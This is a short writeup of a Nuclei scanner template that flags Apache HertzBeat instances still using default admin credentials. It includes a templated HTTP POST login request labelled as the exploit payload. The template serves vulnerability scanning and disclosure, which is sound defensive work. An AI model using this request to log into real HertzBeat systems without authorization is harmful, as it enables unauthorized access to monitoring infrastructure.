# Nuclei Template: Apache HertzBeat - Default Credentials
**Template ID:** apache-hertzbeat-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`apache-hertzbeat-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache HertzBeat enables default admin (and others) credentials. An attacker can execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /api/account/auth/form HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"type":0,"identifier":"{{username}}","credential":"{{password}}"}
```

## References
- https://github.com/apache/hertzbeat
